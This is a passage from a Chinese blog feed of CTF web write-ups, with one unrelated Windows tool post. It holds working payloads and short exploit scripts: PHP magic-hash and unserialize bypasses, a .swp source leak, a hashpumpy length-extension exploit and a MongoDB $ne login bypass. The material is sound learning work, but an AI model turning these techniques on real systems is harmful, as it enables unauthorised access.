str(res.headers)</span><br><span class="line"></span><br><span class="line">FLAG = head[head.index(<span class="string">'FLAG'</span>)+<span class="number">6</span>:head.index(<span class="string">'FLAG'</span>)+<span class="number">48</span>+<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">flagBase64 = base64.decodestring(FLAG)</span><br><span class="line"></span><br><span class="line">TrueFlag = flagBase64[flagBase64.index(<span class="string">':'</span>)+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'key'</span>: TrueFlag&#125;</span><br><span class="line">res = requests.post(url=<span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure></p><p>师傅写的代码比我好看多了</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://ctf4.shiyanbar.com/web/10.php"</span> <span class="comment"># 目标URL</span></span><br><span class="line">s = requests.Session() <span class="comment"># 获取 Session</span></span><br><span class="line">response = s.get(url) <span class="comment"># 打开链接</span></span><br><span class="line">head = response.headers <span class="comment"># 获取响应头</span></span><br><span class="line">flag = base64.b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>] <span class="comment"># 获取相应头中的Flag</span></span><br><span class="line"><span class="keyword">print</span> flag <span class="comment"># 打印Flag</span></span><br><span class="line">postData = &#123;<span class="string">'key'</span>: flag&#125; <span class="comment"># 构造Post请求体</span></span><br><span class="line">result = s.post(url=url, data=postData) <span class="comment"># 利用Post方式发送请求</span></span><br><span class="line"><span class="comment"># (注意要在同一个Session中 , 有的时候还需要设置Cookies , 但是此题不需要)</span></span><br><span class="line"><span class="keyword">print</span> result.text <span class="comment"># 打印响应内容</span></span><br></pre></td></tr></table></figure></p><h2>拐弯抹角</h2><p>这个涉及到我的知识盲区，叫做伪静态页面<a href="https://baike.baidu.com/item/%E4%BC%AA%E9%9D%99%E6%80%81" target="_blank" rel="noopener">百度百科</a></p><p>payload</p><blockquote><p>http://ctf5.shiyanbar.com/indirection/index.php/a/index.php</p></blockquote><h2>Forms</h2><blockquote><p>作为网络安全的人才，一定要仔细观察每一处地方</p></blockquote><p>比如这个题目的表单：</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    PIN:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"PIN"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"showsource"</span> <span class="attr">value</span>=<span class="string">0</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Enter<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>很明显看到，有一个<code>hidden</code>字段，而且是<code>showsource</code>,如果将其修改为1就能得到源码</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba6.png" alt=""></p><p>源码如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="string">"PIN"</span>];</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">-19827747736161128312837161661727773716166727272616149001823847</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Congratulations! The flag is $flag"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"User with provided PIN not found."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>emmmm后面就不说了</p><h2>天网管理系统</h2><p>查看源码有隐藏字段</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --&gt;</span></span><br></pre></td></tr></table></figure></p><p>联想到php代码审计的小trick</p><p>md5(QNKCDZO)得到的结果是0e开头的</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba7.png" alt=""></p><p>得到提示，</p><p>访问<code>http://ctf5.shiyanbar.com/10/web1/user.php?fame=hjkleffifer</code></p><p>得到：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br></pre></td></tr></table></figure></p><p>天真的我以为那三个问号就是真的问号</p><p>唉。。</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'user'</span>=&gt;<span class="keyword">true</span>, <span class="string">'pass'</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"></span><br><span class="line">$c = unserialize($b);</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>将这个作为password输入<code>a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba8.png" alt=""></p><h2>忘记密码</h2><p>这个题目有点难度</p><p>不过还是要获取信息</p><p>查看源代码发现两处关键信息：</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"admin"</span> <span class="attr">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"editor"</span> <span class="attr">content</span>=<span class="string">"Vim"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p><p>告诉了你管理员的邮箱和vim。。告诉我vim干嘛？当然是swp文件了</p><p>此处访问<code>http://ctf5.shiyanbar.com/10/upload/.submit.php.swp</code>可以得到swp文件(这是通过抓包知道发现表单上传的就是这个文件，多试几次，记得在文件名前加*.*)</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>token是0e00000000即可绕过</p><p>payload如下：</p><blockquote><p>http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&amp;token=0e00000000</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下实验吧的wp&lt;/p&gt;
&lt;h2&gt;后台登陆&lt;/h2&gt;
&lt;p&gt;ctrl+u查看源码&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="web" scheme="https://prontosil.club/tags/web/"/>
    
      <category term="实验吧" scheme="https://prontosil.club/tags/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
  </entry>
  
  <entry>
    <title>windows资源管理器神器</title>
    <link href="https://prontosil.club/2019/08/05/windows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%A5%9E%E5%99%A8/"/>
    <id>https://prontosil.club/2019/08/05/windows资源管理器神器/</id>
    <published>2019-08-05T12:47:40.000Z</published>
    <updated>2019-08-05T13:05:30.991Z</updated>
    
    <content type="html"><![CDATA[<p>一直很困惑不知道如何使用资源管理器，每次复制粘贴文件都需要同时打开多个资源管理器然后再emmmm，然后就会嫌资源管理器太多了就无脑x掉了，这时候就会发现mmp我刚打开的资源管理器呢。。。然后又要去找emmmm</p><p>于是去搜了一下用来增强资源管理器的工具找到了这个： <code>QTTabBar</code></p><p>可以说是体验很棒了</p><p><a href="http://qttabbar.wikidot.com/" target="_blank" rel="noopener">网址</a></p><p>比如多标签页</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/tool0.gif" alt=""></p><p>再比如文件和文件夹预览</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/tool1.gif.png" alt=""></p><p>总之很棒就是了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直很困惑不知道如何使用资源管理器，每次复制粘贴文件都需要同时打开多个资源管理器然后再emmmm，然后就会嫌资源管理器太多了就无脑x掉了，这时候就会发现mmp我刚打开的资源管理器呢。。。然后又要去找emmmm&lt;/p&gt;
&lt;p&gt;于是去搜了一下用来增强资源管理器的工具找到了这个：
      
    
    </summary>
    
      <category term="config" scheme="https://prontosil.club/categories/config/"/>
    
    
      <category term="Windows" scheme="https://prontosil.club/tags/Windows/"/>
    
      <category term="资源管理器" scheme="https://prontosil.club/tags/%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>初见哈希扩展攻击</title>
    <link href="https://prontosil.club/2019/08/05/%E5%88%9D%E8%A7%81%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>https://prontosil.club/2019/08/05/初见哈希扩展攻击/</id>
    <published>2019-08-05T12:05:49.000Z</published>
    <updated>2019-08-05T12:33:57.202Z</updated>
    
    <content type="html"><![CDATA[<p>目前还是太菜了，向师傅们好好学习</p><h2>SSRF me</h2><p>点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/index.py" target="_blank" rel="noopener">代码</a></p><p>程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的访问<code>/geneSign</code>可以得到sign的值, action可以是<code>scan</code>或<code>read</code>,但是在访问<code>/De1ctf</code>时,会检验sign是否正确,sign的生成算法：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p><p>这其中<code>secret_key</code>是不知道的,并且<code>gengeSign</code>限制了action只能是<code>scan</code>,结合后来题目的提示是访问<code>flag.txt</code>,但是最多将这个文件读入<code>result.txt</code>,却不能读取出来。</p><p>这样想来是不是只能爆破<code>secret_key</code>了？但是<code>secret_key</code>又怎么会那么容易给你呢。。</p><p>这就涉及到我的知识盲区了,叫做哈希扩展攻击。。</p><p>先看实验吧一道例题</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png" alt=""></p><p>这题，注入不想注入，源码没扫出来，啥信息都没有？</p><p>还是要多关注抓包的信息，尤其是数据包中出现了一些你都没有看过的东西的时候就要仔细看一看了</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba1.png" alt=""></p><p>hhh没想到吧</p><p>原来可以通过这种方式获取到源代码。。</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>empty函数 非空返回false，别想多了</p></blockquote><p>关键在这里：<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p><p>其中<code>$secret</code>是不知道的，<code>$username</code>和<code>password</code>是可以控制的，并且<code>$secret</code>的长度是15</p><p>哈希扩展攻击的原理之后再讨论，我们先分析这题咋搞</p><p>首先username必须是admin,password不能是admin那就随便输一个值比如cck</p><p>我们的目标很简单，就是绕过它<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p><p>所以目标就是让<code>$COOKIE[&quot;getmein&quot;]</code>和md5后的值相等，所以需要同时伪造两边的值天平才能平衡</p><p>而hashpump工具就是来干这个的：<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba2.png" alt=""></p><p>第一个参数是<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>的值，第二个参数是填充的数据，第三个参数是填充数据加key的长度，第四个参数是添加的数据。这样就能同时生成天平左边和右边的值了</p><p>当然还需要URL编码一下</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba4.png" alt=""></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba3.png" alt=""></p><p>理解了这题那么这道De1ctf的题目也就好说了</p><p>参考ctftime上的exp代码如下：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,hashpumpy,urllib</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Arguments:</span></span><br><span class="line"><span class="string">    hexdigest(str):      Hex-encoded result of hashing key + original_data.</span></span><br><span class="line"><span class="string">    original_data(str):  Known data used to get the hash result hexdigest.</span></span><br><span class="line"><span class="string">    data_to_add(str):    Data to append</span></span><br><span class="line"><span class="string">    key_length(int):     Length of unknown data prepended to the hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    A tuple containing the new hex digest and the new message.</span></span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload = <span class="string">'flag.txt'</span></span><br><span class="line">param = <span class="string">'param='</span> + payload</span><br><span class="line">base_url = <span class="string">'http://139.180.128.86/'</span></span><br><span class="line">signurl = base_url + <span class="string">'geneSign?'</span> + param</span><br><span class="line">r = requests.post(url=signurl,cookies=&#123;<span class="string">'action'</span>:<span class="string">'scan'</span>&#125;)</span><br><span class="line">sign = r.content</span><br><span class="line">print(sign)</span><br><span class="line">readsign,add_data = hashpumpy.hashpump(sign,payload+<span class="string">'scan'</span>,<span class="string">'read'</span>,<span class="number">16</span>)</span><br><span class="line">print(readsign)</span><br><span class="line"><span class="comment"># print add_data</span></span><br><span class="line">add_data = add_data[len(payload):]</span><br><span class="line">print(add_data)</span><br><span class="line">expurl = base_url + <span class="string">'De1ta?'</span> + param</span><br><span class="line">print(urllib.parse.quote(add_data))</span><br><span class="line">r = requests.post(url=expurl,cookies=&#123;<span class="string">'action'</span>:urllib.parse.quote(add_data),<span class="string">'sign'</span>:readsign&#125;)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure></p><p>当然我用的是python3，并且注意<code>urllib.parse.quote(add_data)</code>方法</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba5.png" alt=""></p><p>就成功了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目前还是太菜了，向师傅们好好学习&lt;/p&gt;
&lt;h2&gt;SSRF me&lt;/h2&gt;
&lt;p&gt;点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下&lt;a href=&quot;https://raw.githubusercontent.com/xinyongpeng/gitpi
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="hash" scheme="https://prontosil.club/tags/hash/"/>
    
      <category term="De1ctf" scheme="https://prontosil.club/tags/De1ctf/"/>
    
  </entry>
  
  <entry>
    <title>noSQL Injection</title>
    <link href="https://prontosil.club/2019/08/04/noSQL-Injection/"/>
    <id>https://prontosil.club/2019/08/04/noSQL-Injection/</id>
    <published>2019-08-04T08:23:29.000Z</published>
    <updated>2019-08-14T07:46:10.318Z</updated>
    
    <content type="html"><![CDATA[<h2>cybrics noSQL</h2><p>这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下</p><p>php操作mongodb的语法：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connect to mongodb</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();</span><br><span class="line"><span class="comment">// select a database</span></span><br><span class="line">$db = $m-&gt;test;</span><br><span class="line"><span class="comment">// select collection</span></span><br><span class="line">$collection = $db-&gt;users;</span><br><span class="line"></span><br><span class="line">$cursor = $collection-&gt;find($data);</span><br><span class="line">$cursor = $collection-&gt;findone($data);</span><br></pre></td></tr></table></figure></p><p>基本上就是实例化对象，选择数据库，选择表，然后开始查找</p><p>查询语法主要如下：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.user.find(&#123;<span class="string">'username'</span>: <span class="string">'xxxppp'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找用户名不为admin且password为123456的用户</span></span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:&#123;$ne:<span class="string">'admin'</span>&#125;, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//正则匹配：</span></span><br><span class="line"></span><br><span class="line">db.customer.find(&#123;<span class="string">'name'</span>: &#123;<span class="string">'$regex'</span>:<span class="string">'.*s.*'</span>&#125; &#125;)</span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:/jrx/i&#125;)</span><br></pre></td></tr></table></figure></p><p>这道题目首先可以用<code>dirsearch</code>发现是git源码泄露，之后用<code>GitHacker.py</code>获取到源码</p><p>查看<code>index.php</code>，首先要登陆，需要绕过<code>auth</code>函数</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>username</code>和<code>password</code>都没有经过过滤就拼接了，但是这里有一个<code>json_decode</code>不太好过</p><p>如果没有<code>json_decode</code>函数，我们可以通过<code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}</code>绕过登陆的限制</p><p>于是这样做：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql0.png" alt=""></p><p>这样就绕过限制登陆了</p><p>来看第二个：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">    $pipeline = [</span><br><span class="line">        [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">        [<span class="string">'$sort'</span> 